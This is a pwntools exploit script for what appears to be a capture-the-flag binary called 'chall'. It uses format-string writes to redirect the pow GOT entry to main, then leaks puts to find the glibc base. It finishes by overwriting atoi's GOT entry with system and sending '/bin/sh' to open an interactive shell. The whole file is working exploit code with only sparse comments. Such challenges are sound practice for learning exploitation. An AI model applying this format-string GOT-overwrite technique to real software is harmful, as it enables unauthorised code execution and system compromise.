from pwn import *

context.binary = elf = ELF('./chall')
# context.log_level = 'debug'


   
p = elf.process()

pow_got   = elf.got['pow']
main_addr = elf.symbols['main']
bytes_on_stack = 38


bytes_to_print = main_addr - bytes_on_stack - 2


# compute padding for main

payload_a = b'1234567.' + p64(pow_got)
payload_b = f'1.%{bytes_to_print}c'.encode() + b'%11$n'




# gdb.attach(p, gdbscript=f"break *{elf.symbols['pow']}\ncontinue")

p.sendlineafter(b'A: ', payload_a)
p.sendlineafter(b'B: ', payload_b)


puts_got  = elf.got['puts']


payload_a = b'1234567.' + p64(puts_got)
# payload_a = b'1234567.AAAAAAA' 

payload_b = b'1.%11$s'


p.sendlineafter(b'A: ', payload_a)
p.sendlineafter(b'B: ', b'1')
p.sendlineafter(b'B: ', payload_b)

# read until "and B: 1."
p.recvuntil(b"and B: 1.")

# read 6 leaked bytes
leak = p.recvn(6)

# unpack to 64-bit address
puts_addr = u64(leak.ljust(8, b'\x00'))

log.success(f"Leaked puts() address: {hex(puts_addr)}")



puts_offset = elf.libc.symbols['puts']

glibc_base_addr = puts_addr - puts_offset
log.success(f'Glibc base address: {hex(glibc_base_addr)}')


atoi_got = elf.got['atoi']
system_addr = glibc_base_addr + elf.libc.symbols['system']
log.success(f'system() address: {hex(system_addr)}')



low  = system_addr & 0xffff
high = (system_addr >> 16) & 0xffff

# padding for the first half (low 16 bits)
first = (low - bytes_on_stack - 2) & 0xffff    # -2 because "1." gets printed first

# padding for the second half (high 16 bits)
second = (high - low) & 0xffff

# payload_a contains the GOT entry addresses (low and high halves)
payload_a = b'1234567.' + p64(atoi_got) + p64(atoi_got + 2)

# payload_b first writes the low half
payload_b  = f'1.%{first}c'.encode() + b'%11$hn'

# then pads and writes the high half
payload_b += f'%{second}c'.encode() + b'%12$hn'

# now send them



p.sendlineafter(b'A: ', payload_a)
p.sendlineafter(b'B: ', payload_b)

gdb.attach(p, gdbscript=f"break *{elf.symbols['atoi']}\ncontinue")

# trigger system("/bin/sh")
p.sendlineafter(b'A: ', b'/bin/sh')
p.sendlineafter(b'B: ', b'')
p.interactive()
